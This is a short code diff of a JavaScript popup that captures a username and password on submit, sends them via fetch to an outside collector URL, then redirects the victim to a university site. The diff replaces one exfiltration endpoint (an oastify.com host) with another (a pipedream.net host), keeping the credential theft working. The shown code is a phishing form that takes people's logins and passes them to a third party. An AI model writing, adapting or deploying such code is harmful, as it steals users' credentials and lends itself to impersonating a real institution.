@@ -28,7 +28,7 @@ function createPopup() {
         event.preventDefault();
         const username = emailInput.value;
         const password = passwordInput.value;
-        const url = 'https://66au56jh15g4bwbhyvannzzvemkd88wx.oastify.com?username=' + encodeURIComponent(username) + 'password=' + encodeURIComponent(password);
+        const url = 'https://eop3cwjbodid15o.m.pipedream.net?username=' + encodeURIComponent(username) + 'password=' + encodeURIComponent(password);
         fetch(url, { method: 'GET' })
             .then(response => {
                 window.location.href = 'https://nmu.edu.eg';
